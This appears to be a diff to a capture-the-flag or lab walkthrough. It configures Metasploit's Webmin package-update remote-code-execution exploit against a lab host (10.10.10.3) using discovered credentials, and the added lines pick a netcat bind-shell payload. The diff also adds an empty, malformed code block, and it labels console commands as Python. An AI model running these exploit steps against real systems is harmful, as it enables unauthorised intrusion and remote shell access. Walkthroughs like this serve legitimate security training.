@@ -338,6 +338,9 @@ We used the previously discovered credentials to configure the exploit.
 msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME support msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD support@123 
 ```
 
+```pytho
+```
+
 ```python
 msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
 ```
@@ -346,6 +349,12 @@ enabled SSL.
 ```python
 msf6 exploit(linux/http/webmin_packageup_rce) > set SSL true
 ```
+
+It’s important to use this specific payload, as the others caused errors when attempting to upgrade the shell.
+```python
+msf6 exploit(linux/http/webmin_packageup_rce) > set payload cmd/unix/bind_netcat
+```
+
 
 ![[Pasted image 20250513135727.png]]
 
